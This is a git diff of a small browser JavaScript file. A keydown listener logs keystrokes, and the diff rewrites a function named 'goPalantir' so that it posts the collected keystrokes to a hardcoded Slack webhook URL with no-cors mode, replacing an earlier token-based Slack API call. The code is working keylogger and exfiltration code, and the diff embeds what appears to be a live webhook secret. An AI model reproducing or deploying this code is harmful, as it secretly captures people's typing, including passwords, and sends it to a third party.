@@ -1,5 +1,5 @@
 let log = [];
-const token = "INSERT_API_KEY";
+// const token = "INSERT_API_KEY";
 
 document.addEventListener('keydown', (event) => {
     
@@ -12,19 +12,31 @@ document.addEventListener('keydown', (event) => {
     }
 });
 
-function goPalantir(load) {
+async function goPalantir(load) {
     try {
-        fetch('https://slack.com/api/chat.postMessage', {
+        load.join("");
+        // fetch('https://slack.com/api/chat.postMessage', {
+        //     method: 'POST',
+        //     headers: {
+        //         'Authorization': `Bearer ${token}`,
+        //         'Content-Type': 'application/json'
+        //     },
+        //     body: JSON.stringify({
+        //         channel: `C0BNS59V22V`,
+        //         text: load,
+        //     })
+        // })
+        fetch('https://hooks.slack.com/services/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', {
             method: 'POST',
+            mode: 'no-cors',
             headers: {
-                'Authorization': `Bearer ${token}`,
-                'Content-Type': 'application/json'
+                // 'Content-Type': 'application/json'
+                'Content-Type': 'text/plain'
             },
             body: JSON.stringify({
-                channel: `C0BNS59V22V`,
-                text: load,
+                text: load
             })
-        })
+        });
     } catch (error) {
         console.log('failed to palantir 💔');
     };
